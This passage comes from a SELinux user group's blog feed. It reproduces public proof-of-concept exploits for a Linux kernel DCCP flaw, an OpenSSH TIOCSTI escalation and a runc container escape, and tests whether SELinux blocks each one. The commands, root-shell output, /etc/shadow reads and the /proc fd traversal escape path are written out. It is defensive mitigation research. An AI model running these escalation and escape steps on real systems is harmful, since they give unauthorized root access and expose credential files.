0 packages upgraded, 27 newly installed, 0 to remove and 131 not upgraded.
--snip--
Processing triggers for initramfs-tools (0.122ubuntu8.1) ...
update-initramfs: Generating /boot/initrd.img-4.4.0-62-generic
W: mdadm: /etc/mdadm/mdadm.conf defines no arrays.

Current status: 125 (-6) upgradable.
root@ubuntu:~# reboot
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Download and copy the PoC code.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@ubuntu:~/CVE-2017-6074$ ls
poc.c  README.md  trigger.c
jsossug@ubuntu:~/CVE-2017-6074$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Compile that code on PoC Ubuntu 16.04.1 LTS;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@ubuntu:~/CVE-2017-6074$ gcc -o pwn poc.c 
jsossug@ubuntu:~/CVE-2017-6074$ ls
poc.c  pwn  README.md  trigger.c
jsossug@ubuntu:~/CVE-2017-6074$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc-with-no-selinux-selinux-permissive&#34;&gt;PoC with no SELinux(SELinux Permissive)&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Confirm SELinux is Permissive mode;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@ubuntu:~/CVE-2017-6074$ getenforce
Permissive
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run PoC bindary;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;jsossug@ubuntu:~/CVE-2017-6074$ ./pwn
[.] namespace sandbox setup successfully
[.] disabling SMEP &amp;amp; SMAP
[.] scheduling 0xffffffff81064550(0x406e0)
[.] waiting for the timer to execute
[.] done
[.] SMEP &amp;amp; SMAP should be off now
[.] getting root
[.] executing 0x402043
[.] done
[.] should be root now
[.] checking if we got root
[+] got r00t ^_^
[!] don&#39;t kill the exploit binary, the kernel will crash
root@ubuntu:/home/jsossug/CVE-2017-6074# ls /root/.bashrc
/root/.bashrc
root@ubuntu:/home/jsossug/CVE-2017-6074# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0
root@ubuntu:/home/jsossug/CVE-2017-6074# cat /etc/shadow
root:XXXXXXXXXXXX:13219:0:99999:7:::
daemon:*:12041:0:99999:7:::
bin:*:12041:0:99999:7:::
--snip--
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc-with-selinux-enabled-selinux-enforcing&#34;&gt;PoC with SELinux Enabled(SELinux Enforcing)&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Reboot and set SELinux as Enforcing.&lt;/p&gt;

&lt;p&gt;jsossug@ubuntu:~/CVE-2017-6074$ getenforce
Enforcing&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run PoC code again;&lt;/p&gt;

&lt;p&gt;jsossug@ubuntu:~/CVE-2017-6074$ ./pwn
[.] namespace sandbox setup successfully
[.] disabling SMEP &amp;amp; SMAP
[.] scheduling 0xffffffff81064550(0x406e0)
socket(SOCK_DCCP): Permission denied&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check AV log. We can find kernel_t(pwn command domain) couldn&amp;rsquo;t create dccp_secket Object Class.;&lt;/p&gt;

&lt;p&gt;Mar  5 19:39:54 ubuntu kernel: [   67.029899] audit: type=1400 audit(1488710394.317:38): avc:  denied  { create } for  pid=4372 comm=&amp;ldquo;pwn&amp;rdquo; scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:system_r:kernel_t:s0 tclass=dccp_socket permissive=0&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Now we understand that SELinux can mitigate CVE-2017-6074 through PoC.&lt;/p&gt;

&lt;p&gt;So we can say it&amp;rsquo;s better to enable SELinux for keeping your system
secure.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OpenSSH vulnerability (CVE-2015-6565) PoC with SELinux</title>
      <link>https://jsoss-sig.github.io/post/omok-selinux-openssh-20170201/</link>
      <pubDate>Thu, 02 Feb 2017 09:46:27 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/post/omok-selinux-openssh-20170201/</guid>
      <description>

&lt;p&gt;We found there was information about PoC to get local priveledge with
CVE-2015-6565(vulnerability for OpenSSH), then we want to make sure can we
protect it by using SELinux or not.&lt;/p&gt;

&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;

&lt;h4 id=&#34;http-www-openwall-com-lists-oss-security-2017-01-26-2&#34;&gt;&lt;a href=&#34;http://www.openwall.com/lists/oss-security/2017/01/26/2&#34;&gt;http://www.openwall.com/lists/oss-security/2017/01/26/2&lt;/a&gt;&lt;/h4&gt;

&lt;h2 id=&#34;prepare-for-poc&#34;&gt;Prepare for PoC&lt;/h2&gt;

&lt;p&gt;Here is a description how to reproduce it. &lt;strong&gt;I used Fedora22-VMWare Guest
because this vulnerability is for OpenSSH 6.8-6.9. Also I assigned only 1 CPU
to that guest.&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Install Fedora22 with OpenSSH-enabled / enabled gcc and those dev tool. Because this is for PoC I didn&amp;rsquo;t update Fedora22(everything package versions are same as DVD).&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The openssh version is 6.8p1-5 ;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [root@localhost ~]# rpm -qa|grep -i openssh
    openssh-6.8p1-5.fc22.x86_64
    openssh-server-6.8p1-5.fc22.x86_64
    openssh-clients-6.8p1-5.fc22.x86_64
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Put PoC code which you can see on &lt;a href=&#34;http://www.openwall.com/lists/oss-security/2017/01/26/2&#34;&gt;the referenced page.&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Compile that code on PoC Fedora22;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@localhost ~]$  gcc not_an_sshnuke.c -o not_an_sshnuke
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc&#34;&gt;PoC&lt;/h2&gt;

&lt;p&gt;Now it&amp;rsquo;s ready for PoC.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Run the code with normal user account;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@localhost ~]$ ./not_an_sshnuke /dev/pts/3
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run the code with normal user account;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@localhost ~]$ ./not_an_sshnuke /dev/pts/3
[*] Waiting for slave device /dev/pts/3
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Open 2 terminals and ssh to the PoC machine in each terminal with normal user account;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@extest ~]$ ssh -l jsossug 172.16.148.139
jsossug@172.16.148.139&#39;s password: 
Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
[jsossug@localhost ~]$ 


[jsossug@extest ~]$ ssh -l jsossug 172.16.148.139
jsossug@172.16.148.139&#39;s password: 
Last login: Sun Jan 29 14:06:21 2017 from 172.16.148.1
[jsossug@localhost ~]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Open another terminal and ssh to the PoC machine with &lt;strong&gt;root&lt;/strong&gt; account. If ;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@extest ~]$ ssh -l root 172.16.148.139
root@172.16.148.139&#39;s password: 
Last login: Sun Jan 29 14:06:37 2017 from 172.16.148.1
[root@localhost ~]# 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;On the first terminal, you can see following results;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ ./not_an_sshnuke /dev/pts/3
[*] Waiting for slave device /dev/pts/3
[+] Got PTY slave /dev/pts/3
[+] Making PTY slave the controlling terminal
[+] SUID shell at /tmp/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Just want to make sure /tmp/sh attribute;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# ls -lZ /tmp/sh
-rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:31 /tmp/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Then run /tmp/sh on first terminal with following option;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ /tmp/sh --norc --noprofile -p
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Now we got &amp;ldquo;euid=0&amp;rdquo;;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sh-4.3# id
uid=1000(jsossug) gid=1000(jsossug) euid=0(root) groups=1000(jsossug),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.3# cat /etc/shadow
bin:*:16489:0:99999:7:::
daemon:*:16489:0:99999:7:::
adm:*:16489:0:99999:7:::
lp:*:16489:0:99999:7:::
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;SELinux is &amp;ldquo;Enabled&amp;rdquo;;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sh-4.3# getenforce
Enforcing
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc-with-updated-selinux&#34;&gt;PoC with &amp;ldquo;updated SELinux&amp;rdquo;&lt;/h2&gt;

&lt;p&gt;So, we found normal(non-upgraded) SELinux Policy on Fedora22 can&amp;rsquo;t protect
tihs vulnerability.&lt;/p&gt;

&lt;p&gt;Then now we wonder how about &amp;ldquo;updated SELinux Policy&amp;rdquo;.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Update SELinux Policy;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# dnf -y update selinux-policy-targeted
Fedora 22 - x86_64 - Updates                    2.2 MB/s |  23 MB     00:10    
Last metadata expiration check performed 0:00:13 ago on Wed Feb  1 04:46:43 2017.
Dependencies resolved.
================================================================================
 Package                    Arch      Version                  Repository  Size
================================================================================
Upgrading:
 selinux-policy             noarch    3.13.1-128.28.fc22       updates    428 k
 selinux-policy-targeted    noarch    3.13.1-128.28.fc22       updates    4.1 M

Transaction Summary
================================================================================
Upgrade  2 Packages

Total download size: 4.5 M
Downloading Packages:
  (1/2): selinux-policy-3.13.1-128.28.fc22.noarch 1.6 MB/s | 428 kB     00:00    
  (2/2): selinux-policy-targeted-3.13.1-128.28.fc 998 kB/s | 4.1 MB     00:04    
--------------------------------------------------------------------------------
Total                                           825 kB/s | 4.5 MB     00:05     
Running transaction check
Transaction check succeeded.
Running transaction test
Transaction test succeeded.
Running transaction
  Upgrading   : selinux-policy-3.13.1-128.28.fc22.noarch                    1/4 
  Upgrading   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           2/4 
  Cleanup     : selinux-policy-targeted-3.13.1-122.fc22.noarch              3/4 
  Cleanup     : selinux-policy-3.13.1-122.fc22.noarch                       4/4 
  Verifying   : selinux-policy-targeted-3.13.1-128.28.fc22.noarch           1/4 
  Verifying   : selinux-policy-3.13.1-128.28.fc22.noarch                    2/4 
  Verifying   : selinux-policy-3.13.1-122.fc22.noarch                       3/4 
  Verifying   : selinux-policy-targeted-3.13.1-122.fc22.noarch              4/4 

Upgraded:
  selinux-policy.noarch 3.13.1-128.28.fc22                                      
  selinux-policy-targeted.noarch 3.13.1-128.28.fc22                             

Complete!
[root@localhost ~]# getenforce
Enforcing
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;We continue to that PoC with updated SELinux Policy again;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ ./not_an_sshnuke /dev/pts/3
[*] Waiting for slave device /dev/pts/3
[+] Got PTY slave /dev/pts/3
[+] Making PTY slave the controlling terminal
[+] SUID shell at /tmp/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Just want to make sure /tmp/sh attribute;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# ls -lZ /tmp/sh
-rwsr-xr-x. 1 root root unconfined_u:object_r:user_tmp_t:s0 1084536 Feb  2 01:47 /tmp/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Run /tmp/sh with updated SELinux Policy;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ /tmp/sh --norc --noprofile -p
sh-4.3# id
uid=1000(jsossug) gid=1000(jsossug) euid=0(root) groups=1000(jsossug),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.3# cat /etc/shadow
bin:*:16489:0:99999:7:::
daemon:*:16489:0:99999:7:::
adm:*:16489:0:99999:7:::
lp:*:16489:0:99999:7:::
sh-4.3# exit
exit
[jsossug@localhost src]$ getenforce
Enforcing
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Just we want to make sure SELinux Policy is updated;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[jsossug@localhost src]$ rpm -qa|grep -i selinux-policy
selinux-policy-3.13.1-128.28.fc22.noarch
selinux-policy-targeted-3.13.1-128.28.fc22.noarch
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;It seems that even if we update SELinux Policy, we can&amp;rsquo;t mitigate this
vulnerability(CVE-2015-6565).&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Now we could see that CVE-2015-6565 PoC is successfull even if SELinux is
enforcing. The main reason is because that vulnerability is using TIOCSTI +
ioctl.&lt;/p&gt;

&lt;p&gt;This seems to be close to &lt;a href=&#34;https://www.spinics.net/lists/selinux/msg20112.html&#34;&gt;CVE-2016-7545(can escape SELinux sandboxing). In
that vulnerability, we could fix it by updating
policycoreutils.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Probably we can modify SELinux policy and could be mitigate this
vulnerability. We will continue to check it.&lt;/p&gt;

&lt;p&gt;Also we couldn&amp;rsquo;t reproduce it on Fedora25+openssh6.8p1.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Docker vulnerability (CVE-2016-9962) PoC with SELinux (Again)</title>
      <link>https://jsoss-sig.github.io/post/omok-selinux-docker-20170123/</link>
      <pubDate>Mon, 23 Jan 2017 13:07:34 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/post/omok-selinux-docker-20170123/</guid>
      <description>

&lt;p&gt;This blog is for following up to reproduce CVE-2016-9962(vulnerability for
Docker) and how can we mitigate it by using SELinux.&lt;/p&gt;

&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;

&lt;h4 id=&#34;docker-vulnerability-cve-2016-9962-poc-with-selinux-https-jsoss-sig-github-io-post-omok-selinux-docker-20170118&#34;&gt;&lt;a href=&#34;https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/&#34;&gt;Docker vulnerability (CVE-2016-9962) PoC with SELinux&lt;/a&gt;&lt;/h4&gt;

&lt;h4 id=&#34;https-bugzilla-redhat-com-show-bug-cgi-id-1409531&#34;&gt;&lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&#34;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&lt;/a&gt;&lt;/h4&gt;

&lt;h4 id=&#34;https-bugzilla-suse-com-show-bug-cgi-id-1012568-c2&#34;&gt;&lt;a href=&#34;https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2&#34;&gt;https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2&lt;/a&gt;&lt;/h4&gt;

&lt;h2 id=&#34;mistake-in-previous-poc&#34;&gt;Mistake in Previous PoC&lt;/h2&gt;

&lt;p&gt;I sent previous PoC result to SELinux , I got result I did mistake in Previous
PoC. &lt;strong&gt;Actually, I didn&amp;rsquo;t use SELinux Access Control in Previous PoC&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Previous PoC, &amp;ldquo;[PoC] run container(sh) in shell1;&amp;rdquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr

/ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But Finally I found the &amp;ldquo;runc&amp;rdquo; program is working in &amp;ldquo;unconfined_t&amp;rdquo; domain.
From another terminal, I checked runc domain;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 ~]# ps axZ|grep runc
unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 1578 pts/0 Sl+
0:00 runc run ctr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this means runc is working in unconfined_t domain, then that runc is having
lots of permissions(actually un-confined) from SELinux.&lt;/p&gt;

&lt;p&gt;This is a reason why SELinux couldn&amp;rsquo;t mitigate my previous PoC.&lt;/p&gt;

&lt;h2 id=&#34;assign-container-t-domain-on-runc&#34;&gt;Assign &amp;ldquo;container_t&amp;rdquo; domain on runc.&lt;/h2&gt;

&lt;p&gt;When I checked Fedora25 SELinux Policy, I found that container_t domain is
switched from container_runtime_t(which is domain for docker process, etc.).
And container_runtime_t is transited from initrc domain by exec
container_runtime_exec_t file(/usr/bin/runc), such as;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 ~]# ls -lZ /usr/bin/runc
-rwxr-xr-x. 1 root root system_u:object_r:container_runtime_exec_t:s0 5016704 Jan 20 19:26 /usr/bin/runc



./container.cil:(typetransition initrc_domain container_runtime_exec_t process container_runtime_t)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then, for doing PoC more close to existance situation, we need to run &amp;ldquo;runc&amp;rdquo;
as &amp;ldquo;container_t&amp;rdquo; domain.&lt;/p&gt;

&lt;p&gt;For running &amp;ldquo;runc&amp;rdquo; as &amp;ldquo;container_t&amp;rdquo; domain, we need to add several policy
(typetransition rule and more allow rule) to transit from unconfined_t to
container_t domain. Also I changed PoC directory from /root to /tmp.&lt;/p&gt;

&lt;h2 id=&#34;changed-poc-directory&#34;&gt;Changed PoC directory.&lt;/h2&gt;

&lt;p&gt;For more easy to write Policy for this PoC, I changed PoC directory to /tmp
/PoC-CVE-2016-9962;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 PoC-CVE-2016-9962]# pwd
/tmp/PoC-CVE-2016-9962
[root@fedora25 PoC-CVE-2016-9962]# ls -l
total 4
-rw-r--r--.  1 root root 2364 Jan 20 09:04 config.json
drwxr-xr-x. 18 root root  380 Jan 23 12:33 rootfs
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;additional-policy&#34;&gt;Additional Policy&lt;/h2&gt;

&lt;p&gt;Just for PoC, I made below policy rule file as &amp;ldquo;/root/custom_policy/runc.cil&amp;rdquo;;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(typetransition unconfined_usertype container_runtime_exec_t process container_t
)
(roletransition unconfined_r container_runtime_exec_t process system_r)

(allow container_t user_tmp_t (file (open read execute execute_no_trans)))
(allow container_t var_run_t (dir (write add_name create setattr remove_name rmd
ir)))
(allow container_t var_run_t (fifo_file (create setattr unlink read open)))
(allow container_t ptmx_t (chr_file (read write open ioctl)))
(allow container_t devpts_t (chr_file (setattr read write open ioctl getattr)))
(allow container_t root_t (dir (mounton)))
(allow container_t user_tmp_t (dir (mounton write add_name create remove_name rm
dir)))
(allow container_t user_tmp_t (lnk_file (read)))
(allow container_t proc_t (filesystem (mount remount)))
(allow container_t tmpfs_t (filesystem (mount remount)))
(allow container_t tmpfs_t (dir (setattr write add_name create mounton)))
(allow container_t devpts_t (filesystem (mount)))
(allow container_t sysfs_t (filesystem (mount)))
(allow container_t cgroup_t (filesystem (remount)))
(allow container_t tmpfs_t (lnk_file (create)))
(allow container_t tmpfs_t (chr_file (create setattr read write open getattr ioc
tl append)))
(allow container_t tmpfs_t (file (open create mounton)))
(allow container_t proc_t (dir (mounton)))
(allow container_t proc_t (file (mounton)))
(allow container_t sysctl_irq_t (dir (mounton)))
(allow container_t sysctl_t (dir (mounton)))
(allow container_t sysctl_t (file (mounton)))
(allow container_t proc_kcore_t (file (mounton)))
(allow container_t nsfs_t (file (getattr read open)))
(allow container_t var_run_t (file (create read write open unlink)))
(allow container_t sysfs_t (dir (mounton)))
(allow container_t kernel_t (unix_stream_socket (read write)))
(allow init_t kernel_t (unix_stream_socket (read write)))
(allow container_t init_t (unix_stream_socket (read write)))
[root@fedora25 custom_policy]# cat runc.cil
(typetransition unconfined_usertype container_runtime_exec_t process container_t)
(roletransition unconfined_r container_runtime_exec_t process system_r)

(allow container_t user_tmp_t (file (open read execute execute_no_trans)))
(allow container_t var_run_t (dir (write add_name create setattr remove_name rmdir)))
(allow container_t var_run_t (fifo_file (create setattr unlink read open)))
(allow container_t ptmx_t (chr_file (read write open ioctl)))
(allow container_t devpts_t (chr_file (setattr read write open ioctl getattr)))
(allow container_t root_t (dir (mounton)))
(allow container_t user_tmp_t (dir (mounton write add_name create remove_name rmdir)))
(allow container_t user_tmp_t (lnk_file (read)))
(allow container_t proc_t (filesystem (mount remount)))
(allow container_t tmpfs_t (filesystem (mount remount)))
(allow container_t tmpfs_t (dir (setattr write add_name create mounton)))
(allow container_t devpts_t (filesystem (mount)))
(allow container_t sysfs_t (filesystem (mount)))
(allow container_t cgroup_t (filesystem (remount)))
(allow container_t tmpfs_t (lnk_file (create)))
(allow container_t tmpfs_t (chr_file (create setattr read write open getattr ioctl append)))
(allow container_t tmpfs_t (file (open create mounton)))
(allow container_t proc_t (dir (mounton)))
(allow container_t proc_t (file (mounton)))
(allow container_t sysctl_irq_t (dir (mounton)))
(allow container_t sysctl_t (dir (mounton)))
(allow container_t sysctl_t (file (mounton)))
(allow container_t proc_kcore_t (file (mounton)))
(allow container_t nsfs_t (file (getattr read open)))
(allow container_t var_run_t (file (create read write open unlink)))
(allow container_t sysfs_t (dir (mounton)))
(allow container_t kernel_t (unix_stream_socket (read write)))
(allow init_t kernel_t (unix_stream_socket (read write)))
(allow container_t init_t (unix_stream_socket (read write)))
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;load-additional-policy-to-poc-system&#34;&gt;Load Additional Policy to PoC system&lt;/h2&gt;

&lt;p&gt;On the PoC system&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 ~]# semodule -i /root/custom_policy/runc.cil
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;check-custom-policy-is-working-or-not&#34;&gt;Check custom policy is working or not.&lt;/h2&gt;

&lt;p&gt;After load runc.cil, run &amp;ldquo;runc run ctr&amp;rdquo; in a terminal;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 PoC-CVE-2016-9962]# runc run ctr
/ #
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then open another terminal and check this &amp;ldquo;runc&amp;rdquo; program is working as
&amp;ldquo;container_t&amp;rdquo; domain;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@fedora25 ~]# ps axZ|grep runc
unconfined_u:system_r:container_t:s0-s0:c0.c1023 6799 pts/1 Sl+   0:00 runc run ctr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If the &amp;ldquo;runc&amp;rdquo; is not working on container_t domain, chack
/var/log/audit/audit.log and maybe add several another rules to runc.cil.&lt;/p&gt;

&lt;h2 id=&#34;poc-again&#34;&gt;PoC(Again!)&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;open 2 terminals(shell1, shell2).&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check SELinux is enabled;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# getenforce
Enforcing
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run container(sh) in shell1;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
/ # 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run new container in shell2 with &amp;ldquo;runc exec&amp;rdquo; command. It is pausing 500sec;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run &amp;ldquo;ps ax&amp;rdquo; in shell1. You can see shell2 process;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
/ # ps ax
PID   USER     TIME   COMMAND
    1 root       0:00 sh
    6 root       0:00 /proc/self/exe init
   11 root       0:00 ps ax
/ # 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;In above case, check /proc/6/fd by ls command. You see path as fd/4;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # ls -la /proc/6/fd/
total 0
dr-x------    2 root     root             0 Jan 16 06:43 .
dr-xr-xr-x    9 root     root             0 Jan 16 06:43 ..
lrwx------    1 root     root            64 Jan 16 06:43 0 -&amp;gt; /dev/pts/4
lrwx------    1 root     root            64 Jan 16 06:43 1 -&amp;gt; /dev/pts/4
lrwx------    1 root     root            64 Jan 16 06:43 2 -&amp;gt; /dev/pts/4
lrwx------    1 root     root            64 Jan 16 06:43 3 -&amp;gt; socket:[40487]
lr-x------    1 root     root            64 Jan 16 06:43 4 -&amp;gt; /run/runc/ctr
lrwx------    1 root     root            64 Jan 16 06:43 5 -&amp;gt; /dev/pts/4
lr-x------    1 root     root            64 Jan 16 06:43 6 -&amp;gt; pipe:[40496]
l-wx------    1 root     root            64 Jan 16 06:43 7 -&amp;gt; /dev/null
/ # 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Do ls /etc/shadow file by using &amp;ldquo;/proc/6/fd/4/../../../etc/shadow&amp;rdquo; path;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # ls -l /proc/6/fd/4/../../../etc/shadow
ls: /proc/6/fd/4/../../../etc/shadow: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Check /var/log/audit/audit.log;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    type=AVC msg=audit(1485143271.659:3107): avc:  denied  { getattr } for  pid=8847 comm=&amp;quot;ls&amp;quot; path=&amp;quot;/etc/shadow&amp;quot; dev=&amp;quot;dm-0&amp;quot; ino=785423 scontext=unconfined_u:system_r:container_t:s0-s0:c0.c1023 tcontext=system_u:object_r:shadow_t:s0 tclass=file permissive=0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Fine, Now SELinux is protecting to search /etc/shadow file.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Also you can&amp;rsquo;t read /etc/shadow file because the file permission is &amp;ldquo;000&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # cat /proc/6/fd/4/../../../etc/shadow
cat: can&#39;t open &#39;/proc/6/fd/4/../../../etc/shadow&#39;: Permission denied
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If I change /etc/shadow file as &amp;ldquo;755&amp;rdquo; permission, the DAC control will permit
to read the file.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    [root@fedora25 ~]# chmod 755 /etc/shadow
    [root@fedora25 ~]# ls -lh /etc/shadow
    -rwxr-xr-x. 1 root root 1.3K Jan 20 08:30 /etc/shadow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But still I can&amp;rsquo;t read /etc/shadow file ;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    / # cat /proc/6/fd/4/../../../etc/shadow
    cat: can&#39;t open &#39;/proc/6/fd/4/../../../etc/shadow&#39;: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I could see in the /var/log/audit/audit.log file that the&amp;rdquo;read&amp;rdquo; action is
denied by SELinux;&lt;/p&gt;

